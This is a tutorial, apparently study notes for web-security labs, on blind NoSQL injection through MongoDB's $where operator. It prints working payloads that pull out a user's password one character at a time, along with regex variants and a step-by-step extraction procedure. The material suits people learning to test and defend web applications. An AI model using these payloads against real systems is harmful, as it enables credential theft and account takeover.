# Data Exfiltration via NoSQL Injection

---

# Exploiting NoSQL Syntax Injection to Extract Data

## 1. Concept

Some NoSQL databases (especially **MongoDB**) allow execution of **JavaScript code inside queries**.

Examples include:

- **`$where` operator**
- **`mapReduce()` function**

If user input is inserted into these queries **without sanitization**, attackers can **inject JavaScript code**.

This allows attackers to:

- Extract sensitive data
- Perform **boolean-based data extraction**
- Enumerate database fields
- Retrieve passwords character by character

---

# MongoDB `$where` Operator

### Purpose

The `$where` operator allows **JavaScript expressions** to filter documents.

Example query:

```jsx
db.users.find({
 "$where": "this.username == 'admin'"
})
```

Meaning:

- Return documents where **username = admin**

---

# Vulnerable Scenario

### User Request

```
https://insecure-website.com/user/lookup?username=admin
```

### Backend MongoDB Query

```jsx
{"$where":"this.username == 'admin'"}
```

If the application **directly inserts user input**, an attacker can inject JavaScript conditions.

---

# Exploiting the Vulnerability

## Goal

Extract sensitive data such as:

- Password
- API keys
- Tokens

---

# Boolean-Based Data Extraction

Attackers inject conditions that return **true or false** depending on the value of secret data.

This technique is similar to **blind SQL injection**.

---

# Extracting Password Character by Character

### Example Payload

```
admin' && this.password[0] == 'a' || 'a'=='b
```

### Resulting Query

```jsx
{"$where":"this.username == 'admin' && this.password[0] == 'a' || 'a'=='b'"}
```

---

### How it Works

The injected logic checks:

```
this.password[0] == 'a'
```

Meaning:

- Check if the **first character of the password is 'a'**

---

### Response Behavior

| Condition | Result |
| --- | --- |
| Password starts with **a** | Query returns result |
| Password does NOT start with **a** | Query returns nothing |

---

### Attack Process

1. Guess first character
2. Observe response
3. Move to next character

Example:

```
this.password[0] == 'a'
this.password[0] == 'b'
this.password[0] == 'c'
```

Once correct character is found:

```
this.password[1] == 'a'
```

Repeat until full password is extracted.

---

# Using JavaScript `match()` Function

Attackers can use JavaScript functions like **`match()`** to test patterns.

### Example Payload

```
admin' && this.password.match(/\d/) || 'a'=='b
```

### Meaning

Check if the password contains **a digit**.

---

### Regex Explanation

```
\d
```

Means:

- Any **numeric digit (0-9)**

---

### Resulting Query

```jsx
{"$where":"this.username == 'admin' && this.password.match(/\d/) || 'a'=='b'"}
```

---

### Result

| Condition | Behavior |
| --- | --- |
| Password contains digits | Query returns result |
| No digits | Query fails |

---

# Why `|| 'a'=='b'` Is Used

```
|| 'a'=='b'
```

This part ensures:

- Query remains **syntactically valid**
- The final condition **evaluates false**

This helps control query logic during injection.

---

# Attack Strategy for Data Extraction

Typical extraction steps:

### 1. Confirm Injection

```
admin' && 1==1 || 'a'=='b
```

---

### 2. Identify Field Names

Common fields:

```
username
password
email
role
```

---

### 3. Extract Data Character by Character

Example:

```
this.password[0]=='a'
this.password[1]=='b'
this.password[2]=='c'
```

---

### 4. Use Regex for Faster Enumeration

Example:

```
this.password.match(/^a/)
this.password.match(/^ab/)
this.password.match(/^abc/)
```

---

# Impact

Successful exploitation can lead to:

- **Credential disclosure**
- **Account takeover**
- **Privilege escalation**
- **Sensitive data exposure**

In real-world applications, this could expose:

- Admin passwords
- API tokens
- Internal secrets

---

# Key Takeaways

- MongoDB allows **JavaScript inside queries** via `$where`.
- Unsanitized user input can lead to **JavaScript injection**.
- Attackers can perform **boolean-based extraction**.
- Sensitive data can be extracted **character by character**.

---

If you want, I can also show you **the 5 most common NoSQL payloads used in real pentests and HTB machines**, which makes **PortSwigger labs extremely easy to solve**.